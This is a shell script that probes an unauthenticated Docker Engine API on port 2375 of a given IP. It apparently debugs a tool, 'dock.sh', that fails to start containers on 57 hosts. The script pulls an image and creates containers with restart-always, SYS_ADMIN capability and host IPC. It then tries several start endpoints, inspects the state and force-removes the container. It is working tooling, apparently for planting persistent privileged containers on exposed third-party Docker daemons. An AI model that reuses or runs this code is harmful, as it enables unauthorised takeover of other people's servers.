#!/bin/sh
# probe: why do 57 hosts "create" but not "start"?
#
# Hypothesis under test: name-based paths 404 on these daemons (old Engine
# 18.06 / proxy fronts answer "page not found" to /containers/<name>/json), so
# dock.sh's name loop "sees a free name" and its start is lost - while create,
# which carries the id in its *response*, is fine.
#
# So: create, take the id from the response, and try every spelling of start
# against it (bare, version-pinned to the daemon's own ApiVersion). Body A is
# dock.sh's exact HostConfig, B is a minimal one - if A fails where B works, the
# caps/ipc/shares are the blocker.
ip=$1
[ -n "$ip" ] || { echo "usage: $0 <ip>"; exit 2; }
nm=probe$$
BODY_A="{\"Image\":\"alpine:3.19\",\"Cmd\":[\"sleep\",\"3000\"],\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":512,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\"}}"
BODY_B="{\"Image\":\"alpine:3.19\",\"Cmd\":[\"sleep\",\"3000\"],\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"

api=$(curl -sS -m 6 "http://$ip:2375/version" 2>/dev/null | grep -o 'ApiVersion[^0-9]*[0-9.]*' | grep -o '[0-9][0-9.]*$')
echo "== $ip api=${api:-?}"
if ! curl -fsS -m 8 "http://$ip:2375/images/alpine:3.19/json" >/dev/null 2>&1; then
    echo "-- pulling alpine"
    curl -sS -m 120 -X POST "http://$ip:2375/images/create?fromImage=alpine:3.19" >/dev/null 2>&1 || :
fi

try() {
    tag=$1; body=$2
    r=$(curl -sS -m 30 -X POST "http://$ip:2375/containers/create?name=$tag" \
            -H Content-Type:application/json -d "$body" 2>/dev/null)
    echo "-- create[$tag]: $(printf '%s' "$r" | head -c 160)"
    id=$(printf '%s' "$r" | grep -oE '[0-9a-f]{64}' | head -1)
    [ -n "$id" ] || return 0
    echo "   id=${id%??????????????????????????????????????????????????????}"
    echo "   inspect: $(curl -sS -m 8 "http://$ip:2375/containers/$id/json" 2>/dev/null | head -c 200)"
    echo "   start  : $(curl -sS -m 25 -X POST "http://$ip:2375/containers/$id/start" 2>/dev/null | head -c 300)"
    if [ -n "$api" ]; then
        echo "   startv : $(curl -sS -m 25 -X POST "http://$ip:2375/v$api/containers/$id/start" 2>/dev/null | head -c 300)"
    fi
    echo "   state  : $(curl -sS -m 8 "http://$ip:2375/containers/$id/json" 2>/dev/null | grep -o '\"Status\":\"[a-z]*\"' | head -1)"
    echo "   rm     : $(curl -sS -m 20 -X DELETE "http://$ip:2375/containers/$id?force=1" 2>/dev/null | head -c 120)"
}
try "$nm-a" "$BODY_A"
try "$nm-b" "$BODY_B"
